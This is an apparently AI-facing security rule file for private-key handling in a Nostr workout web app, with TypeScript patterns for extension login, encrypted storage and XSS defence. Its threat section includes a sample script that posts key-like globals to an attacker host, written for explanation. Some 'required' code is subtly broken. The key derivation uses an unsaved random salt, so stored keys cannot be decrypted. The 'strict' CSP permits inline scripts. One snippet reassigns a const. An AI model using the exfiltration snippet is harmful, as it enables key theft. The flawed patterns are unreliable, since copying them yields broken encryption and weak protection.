# Web Private Key Security Rule

## Brief overview
This rule establishes comprehensive security guidelines for handling private keys, sensitive data, and authentication in the POWR Workout PWA, ensuring all cryptographic operations follow web browser security best practices.

## Core Security Principles

### 1. **Never Hardcode Sensitive Data**
- ❌ **FORBIDDEN**: Hardcoded private keys, passwords, or secrets in any file
- ❌ **FORBIDDEN**: Committing sensitive data to version control
- ❌ **FORBIDDEN**: Storing keys in plain text in localStorage or sessionStorage
- ✅ **REQUIRED**: Use encrypted browser storage with proper key derivation

### 2. **Browser Storage Security Requirements**
- ✅ **NIP-07 FIRST**: Prefer browser extension authentication when available
- ✅ **ENCRYPTED FALLBACK**: Always encrypt private keys before browser storage
- ✅ **SECURE BY DEFAULT**: Never store unencrypted keys in localStorage
- ✅ **PRODUCTION READY**: Maintain security standards for production PWA

### 3. **Authentication Architecture**
- ✅ **NIP-07 FIRST**: Detect and use browser extensions (Alby, nos2x, etc.)
- ✅ **FALLBACK**: Secure private key input with proper validation
- ✅ **PROVIDER PATTERN**: Access authenticated NDK through React context
- ✅ **SINGLE SOURCE**: One NDK instance per session, properly authenticated

## Required Implementation Patterns

### ✅ **CORRECT Patterns**

#### NIP-07 Browser Extension Detection
```typescript
// CORRECT: Detect and use browser extensions first
const detectNIP07 = async (): Promise<boolean> => {
  return typeof window !== 'undefined' && 
         typeof window.nostr !== 'undefined' &&
         typeof window.nostr.getPublicKey === 'function';
};

// CORRECT: Use extension for authentication
const authenticateWithExtension = async (): Promise<{ pubkey: string }> => {
  if (!await detectNIP07()) {
    throw new Error('No NIP-07 extension detected');
  }
  
  const pubkey = await window.nostr.getPublicKey();
  return { pubkey };
};
```

#### Secure Private Key Storage (Fallback)
```typescript
// CORRECT: Encrypt before storing in browser
import { encrypt, decrypt } from '@/lib/crypto-utils';

const storePrivateKey = async (privateKey: string, userPassword: string): Promise<void> => {
  // Derive encryption key from user password
  const encryptionKey = await deriveKey(userPassword);
  
  // Encrypt private key
  const encryptedKey = await encrypt(privateKey, encryptionKey);
  
  // Store encrypted data
  localStorage.setItem('encrypted_nostr_key', JSON.stringify({
    data: encryptedKey,
    timestamp: Date.now()
  }));
};

const retrievePrivateKey = async (userPassword: string): Promise<string> => {
  const stored = localStorage.getItem('encrypted_nostr_key');
  if (!stored) throw new Error('No stored key found');
  
  const { data } = JSON.parse(stored);
  const encryptionKey = await deriveKey(userPassword);
  
  return await decrypt(data, encryptionKey);
};
```

#### NDK Provider with Security
```typescript
// CORRECT: Secure NDK provider with multiple auth methods
export const NDKProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [ndk, setNDK] = useState<NDK | null>(null);
  const [pubkey, setPubkey] = useState<string | null>(null);
  const [authMethod, setAuthMethod] = useState<'extension' | 'private-key' | null>(null);

  const authenticateWithExtension = async () => {
    if (!await detectNIP07()) return false;
    
    try {
      const pubkey = await window.nostr.getPublicKey();
      const ndkInstance = new NDK({
        explicitRelayUrls: RELAY_URLS,
        cacheAdapter: new NDKCacheAdapterDexie()
      });
      
      await ndkInstance.connect();
      setPubkey(pubkey);
      setNDK(ndkInstance);
      setAuthMethod('extension');
      return true;
    } catch (error) {
      console.error('Extension auth failed:', error);
      return false;
    }
  };

  const authenticateWithPrivateKey = async (privateKey: string) => {
    const validation = validatePrivateKey(privateKey);
    if (!validation.valid) {
      throw new Error('Invalid private key format');
    }

    const signer = new NDKPrivateKeySigner(privateKey);
    const ndkInstance = new NDK({
      explicitRelayUrls: RELAY_URLS,
      signer,
      cacheAdapter: new NDKCacheAdapterDexie()
    });

    await ndkInstance.connect();
    setPubkey(signer.user.pubkey);
    setNDK(ndkInstance);
    setAuthMethod('private-key');
  };

  return (
    <NDKContext.Provider value={{ 
      ndk, 
      pubkey, 
      authMethod,
      authenticateWithExtension,
      authenticateWithPrivateKey 
    }}>
      {children}
    </NDKContext.Provider>
  );
};
```

### ❌ **FORBIDDEN Patterns**

#### Hardcoded Keys
```typescript
// FORBIDDEN: Never hardcode keys
const privateKey = 'abc123...'; // ❌ SECURITY VIOLATION
const testKey = '64-char-hex-string'; // ❌ SECURITY VIOLATION
```

#### Unencrypted Browser Storage
```typescript
// FORBIDDEN: Plain text storage
localStorage.setItem('nostr_key', privateKey); // ❌ SECURITY VIOLATION
sessionStorage.setItem('user_key', key); // ❌ SECURITY VIOLATION
```

#### Creating Multiple NDK Instances
```typescript
// FORBIDDEN: Bypasses authentication
const { ndk } = await initializeNDK(); // ❌ Creates unauthenticated instance
const newNDK = new NDK(); // ❌ Bypasses security
```

## Web Security Threat Model

### **Private Key Exposure Risks in Web Environments**

#### ✅ **SECURE: NIP-07 Browser Extensions (RECOMMENDED)**
```typescript
// SECURE: Private key never exposed to web application
const pubkey = await window.nostr.getPublicKey(); // ✅ Only public key exposed
const signedEvent = await window.nostr.signEvent(event); // ✅ Signing happens in extension
```
**Security**: Private key remains in browser extension, never exposed to web application code.

#### ⚠️ **ACCEPTABLE: Encrypted Browser Storage (FALLBACK ONLY)**
```typescript
// ACCEPTABLE: Private key temporarily in memory during use
const privateKey = await retrievePrivateKey(userPassword); // ⚠️ Briefly in memory
const signer = new NDKPrivateKeySigner(privateKey); // ⚠️ NDK holds reference
// Clear from memory after use
privateKey = null; // Limited effectiveness in JavaScript
```
**Security Risks**:
- **Memory Exposure**: Private key exists in JavaScript memory during authentication
- **Browser DevTools**: Accessible via debugger/console if user has DevTools open
- **Memory Dumps**: Could be captured in browser crash dumps or debugging
- **XSS Attacks**: Malicious scripts could potentially access memory
- **Browser Extensions**: Other extensions might access page memory

### **Understanding Web Security Threats**

#### **XSS (Cross-Site Scripting) Attacks - PRIMARY THREAT**
**What is XSS?** Malicious JavaScript code injected into your web application that runs in users' browsers.

**How XSS Works:**
```typescript
// Example: Malicious script injected via user input
const userComment = "<script>alert('XSS!');</script>"; // ❌ Dangerous if not sanitized
document.innerHTML = userComment; // ❌ Executes malicious script

// XSS script could steal private keys from memory:
const maliciousScript = `
<script>
  // Access all variables in global scope
  for (let key in window) {
    if (key.includes('private') || key.includes('key')) {
      // Send private key to attacker's server
      fetch('https://attacker.com/steal', { 
        method: 'POST', 
        body: window[key] 
      });
    }
  }
</script>
`;
```

**XSS Prevention (REQUIRED):**
```typescript
// ✅ CORRECT: Sanitize all user input
import DOMPurify from 'dompurify';

const safeHTML = DOMPurify.sanitize(userInput);
element.innerHTML = safeHTML;

// ✅ CORRECT: Use React's built-in XSS protection
const UserComment = ({ comment }: { comment: string }) => (
  <div>{comment}</div> // React automatically escapes this
);

// ❌ FORBIDDEN: Direct HTML injection
element.innerHTML = userInput; // Dangerous!
element.insertAdjacentHTML('beforeend', userInput); // Dangerous!
```

#### **Other Major Web Threats (In Order of Risk)**

**1. Malicious Browser Extensions**
```typescript
// Extensions can access page memory and localStorage
// Mitigation: Use NIP-07 extensions only, warn about others
const warnAboutExtensions = () => {
  if (chrome?.runtime?.getManifest) {
    console.warn('Browser extensions detected - use trusted Nostr extensions only');
  }
};
```

**2. Man-in-the-Middle (MITM) Attacks**
```typescript
// Attacker intercepts network traffic
// Mitigation: HTTPS only, certificate pinning
const enforceHTTPS = () => {
  if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
    location.replace(`https:${location.href.substring(location.protocol.length)}`);
  }
};
```

**3. Browser DevTools Access**
```typescript
// User or attacker opens DevTools to inspect memory
// Mitigation: Clear variables, obfuscation (limited effectiveness)
const detectDevTools = () => {
  let devtools = { open: false };
  const threshold = 160;
  
  setInterval(() => {
    if (window.outerHeight - window.innerHeight > threshold || 
        window.outerWidth - window.innerWidth > threshold) {
      if (!devtools.open) {
        devtools.open = true;
        console.warn('DevTools detected - clearing sensitive data');
        clearSensitiveData();
      }
    }
  }, 500);
};
```

**4. Memory Dump Attacks**
```typescript
// Browser crashes or debugging tools capture memory
// Mitigation: Minimize time in memory, use secure strings
const secureString = (value: string) => {
  // Limited effectiveness in JavaScript, but better than nothing
  const buffer = new ArrayBuffer(value.length * 2);
  const view = new Uint16Array(buffer);
  for (let i = 0; i < value.length; i++) {
    view[i] = value.charCodeAt(i);
  }
  return { buffer, clear: () => view.fill(0) };
};
```

#### **Threat Risk Assessment for POWR PWA**

**🔴 HIGH RISK (Address Immediately)**
1. **XSS Attacks** - Can steal keys from memory instantly
2. **Malicious Extensions** - Can access all page data
3. **Unencrypted Storage** - Keys readable by any script

**🟡 MEDIUM RISK (Mitigate with Best Practices)**
4. **DevTools Access** - Requires user to open tools
5. **MITM Attacks** - Mitigated by HTTPS
6. **Memory Dumps** - Rare occurrence

**🟢 LOW RISK (Monitor but Not Critical)**
7. **Physical Access** - User's own device
8. **Browser Vulnerabilities** - Patched regularly
9. **DNS Attacks** - Mitigated by HTTPS/certificates

#### **Why NIP-07 Extensions Are Safer**
```typescript
// With NIP-07: Private key NEVER enters your web application
const safeNostrOperation = async () => {
  // ✅ Private key stays in extension
  const pubkey = await window.nostr.getPublicKey();
  const signedEvent = await window.nostr.signEvent(event);
  
  // Your app never sees the private key
  // XSS attacks can't steal what isn't there
};

// With private key storage: Key exists in your app's memory
const riskyNostrOperation = async () => {
  // ⚠️ Private key temporarily in memory - vulnerable to XSS
  const privateKey = await retrievePrivateKey(password);
  const signer = new NDKPrivateKeySigner(privateKey);
  
  // XSS could potentially access privateKey variable
  // Even after clearing, memory traces might remain
};
```

#### ❌ **INSECURE: Plain Text Storage**
```typescript
// INSECURE: Never do this
localStorage.setItem('nostr_key', privateKey); // ❌ Readable by any script
```

### **Web-Specific Security Mitigations**

#### Content Security Policy (CSP)
```typescript
// REQUIRED: Strict CSP to prevent XSS
const cspHeader = `
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  connect-src 'self' wss://relay.damus.io wss://nos.lol;
  img-src 'self' data: https:;
  style-src 'self' 'unsafe-inline';
`;
```

#### Memory Management Best Practices
```typescript
// REQUIRED: Clear sensitive data from memory
const authenticateWithPrivateKey = async (privateKey: string) => {
  try {
    const validation = validatePrivateKey(privateKey);
    if (!validation.valid) {
      throw new Error('Invalid private key format');
    }

    const signer = new NDKPrivateKeySigner(privateKey);
    const ndkInstance = new NDK({
      explicitRelayUrls: RELAY_URLS,
      signer,
      cacheAdapter: new NDKCacheAdapterDexie()
    });

    await ndkInstance.connect();
    
    // Clear original private key variable (limited effectiveness)
    privateKey = '';
    
    return { ndk: ndkInstance, pubkey: signer.user.pubkey };
  } catch (error) {
    // Ensure cleanup on error
    privateKey = '';
    throw error;
  }
};
```

#### Session Management
```typescript
// REQUIRED: Automatic session cleanup
const setupSessionCleanup = () => {
  // Clear on page unload
  window.addEventListener('beforeunload', () => {
    clearAllSensitiveData();
  });
  
  // Clear on visibility change (tab switch)
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
      // Optional: Clear sensitive data when tab is hidden
      clearMemoryReferences();
    }
  });
  
  // Auto-logout after inactivity
  let inactivityTimer: NodeJS.Timeout;
  const resetInactivityTimer = () => {
    clearTimeout(inactivityTimer);
    inactivityTimer = setTimeout(() => {
      logout(); // Clear all authentication
    }, 30 * 60 * 1000); // 30 minutes
  };
  
  ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart'].forEach(event => {
    document.addEventListener(event, resetInactivityTimer, true);
  });
};
```

### **Security Recommendations by Use Case**

#### For Maximum Security (Recommended)
1. **NIP-07 Extensions Only**: Disable private key fallback entirely
2. **Extension Detection**: Require users to install Alby, nos2x, or similar
3. **No Browser Storage**: Never store any cryptographic material

#### For User Convenience (Acceptable Risk)
1. **NIP-07 First**: Always try extension authentication first
2. **Encrypted Fallback**: Allow private key storage with strong encryption
3. **Clear Warnings**: Inform users about security trade-offs
4. **Session Limits**: Automatic logout and memory cleanup

#### For Development/Testing Only
1. **Memory Storage**: Keep keys in memory only during development
2. **Clear Separation**: Never mix development patterns with production
3. **Environment Checks**: Disable insecure patterns in production builds

### **User Education Requirements**

#### Security Warnings for Private Key Storage
```typescript
const SecurityWarningModal = () => (
  <div className="security-warning">
    <h3>⚠️ Security Notice</h3>
    <p>
      Storing your private key in the browser has security risks:
    </p>
    <ul>
      <li>Your key will be temporarily visible in browser memory</li>
      <li>Other browser extensions might access your data</li>
      <li>Browser debugging tools could expose your key</li>
    </ul>
    <p>
      <strong>Recommended:</strong> Use a Nostr browser extension like Alby for maximum security.
    </p>
    <button onClick={installExtension}>Install Alby Extension</button>
    <button onClick={proceedWithRisk}>I Understand the Risks</button>
  </div>
);
```

## Browser-Specific Security Patterns

### Crypto Utilities Implementation
```typescript
// REQUIRED: Secure encryption utilities for browser
export const deriveKey = async (password: string, salt?: Uint8Array): Promise<CryptoKey> => {
  const encoder = new TextEncoder();
  const keyMaterial = await crypto.subtle.importKey(
    'raw',
    encoder.encode(password),
    'PBKDF2',
    false,
    ['deriveBits', 'deriveKey']
  );

  const derivedSalt = salt || crypto.getRandomValues(new Uint8Array(16));
  
  return crypto.subtle.deriveKey(
    {
      name: 'PBKDF2',
      salt: derivedSalt,
      iterations: 100000,
      hash: 'SHA-256'
    },
    keyMaterial,
    { name: 'AES-GCM', length: 256 },
    false,
    ['encrypt', 'decrypt']
  );
};

export const encrypt = async (data: string, key: CryptoKey): Promise<string> => {
  const encoder = new TextEncoder();
  const iv = crypto.getRandomValues(new Uint8Array(12));
  
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    encoder.encode(data)
  );

  // Combine IV and encrypted data
  const combined = new Uint8Array(iv.length + encrypted.byteLength);
  combined.set(iv);
  combined.set(new Uint8Array(encrypted), iv.length);
  
  return btoa(String.fromCharCode(...combined));
};

export const decrypt = async (encryptedData: string, key: CryptoKey): Promise<string> => {
  const combined = new Uint8Array(
    atob(encryptedData).split('').map(char => char.charCodeAt(0))
  );
  
  const iv = combined.slice(0, 12);
  const data = combined.slice(12);
  
  const decrypted = await crypto.subtle.decrypt(
    { name: 'AES-GCM', iv },
    key,
    data
  );

  return new TextDecoder().decode(decrypted);
};
```

### Private Key Validation
```typescript
// REQUIRED: Validate private key format
export const validatePrivateKey = (key: string): { valid: boolean; error?: string } => {
  if (!key) {
    return { valid: false, error: 'Private key is required' };
  }

  // Remove any whitespace
  const cleanKey = key.trim();

  // Check if it's a valid hex string of correct length
  if (!/^[a-fA-F0-9]{64}$/.test(cleanKey)) {
    return { 
      valid: false, 
      error: 'Private key must be 64 character hex string' 
    };
  }

  // Additional validation - ensure it's not all zeros or all ones
  if (cleanKey === '0'.repeat(64) || cleanKey === 'f'.repeat(64)) {
    return { 
      valid: false, 
      error: 'Invalid private key value' 
    };
  }

  return { valid: true };
};
```

## Implementation Checklist

### **When Adding Authentication Features**
- [ ] Check for NIP-07 extension availability first
- [ ] Provide secure private key fallback option
- [ ] Validate all key formats before processing
- [ ] Encrypt sensitive data before browser storage
- [ ] Use proper key derivation for encryption
- [ ] Clear sensitive data from memory after use

### **When Handling User Input**
- [ ] Validate private key format using `validatePrivateKey()`
- [ ] Never log or expose private keys in error messages
- [ ] Provide clear error messages without exposing keys
- [ ] Use secure input fields (type="password") for key entry

### **When Testing**
- [ ] Use real authentication for integration tests
- [ ] Mock only external services, not authentication
- [ ] Test both NIP-07 and private key authentication paths
- [ ] Verify credential cleanup on logout

## Security Audit Requirements

### **Code Review Checklist**
- [ ] No hardcoded keys or sensitive data
- [ ] All sensitive data encrypted before browser storage
- [ ] NIP-07 detection and fallback properly implemented
- [ ] Private key validation on all user inputs
- [ ] Proper error handling without data exposure
- [ ] Memory cleanup on logout/session end

### **Regular Security Checks**
- [ ] Audit all files containing 'private', 'key', 'secret'
- [ ] Verify encryption/decryption patterns
- [ ] Check for credential leaks in console logs
- [ ] Validate authentication flows in both modes
- [ ] Test logout credential cleanup

## Emergency Security Protocols

### **If Credentials Are Compromised**
1. **Immediate**: Clear all browser storage
2. **User Action**: Generate new key pair or use different extension
3. **Verification**: Confirm old credentials are cleared
4. **Testing**: Verify new authentication works

### **If Security Violation Found**
1. **Stop**: Halt development immediately
2. **Assess**: Determine scope of violation
3. **Fix**: Implement proper security pattern
4. **Audit**: Review related code for similar issues
5. **Test**: Verify fix maintains security

## Best Practices Summary

### **DO**
- ✅ Use NIP-07 browser extensions when available
- ✅ Encrypt all sensitive data before browser storage
- ✅ Validate all user inputs before processing
- ✅ Use proper key derivation for encryption
- ✅ Clear credentials properly on logout
- ✅ Test with real authentication when possible

### **DON'T**
- ❌ Hardcode any sensitive information
- ❌ Store unencrypted keys in browser storage
- ❌ Create multiple NDK instances
- ❌ Log sensitive information to console
- ❌ Mix test patterns with production code
- ❌ Bypass authentication utilities

## References

### **Secure Implementation Examples**
- `providers/NDKProvider.tsx` - Secure NDK authentication
- `lib/crypto-utils.ts` - Browser encryption utilities
- `components/auth/` - Authentication components

### **Security Documentation**
- [Web Crypto API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API)
- [NIP-07 Specification](https://github.com/nostr-protocol/nips/blob/master/07.md)
- [Browser Storage Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Nostr Security Best Practices](https://github.com/nostr-protocol/nips)

This rule ensures all cryptographic operations in the POWR Workout PWA maintain the highest security standards while providing clear guidance for web browser environments.

---

**Last Updated**: 2025-06-21
**Project**: POWR Workout PWA
**Environment**: Web Browser
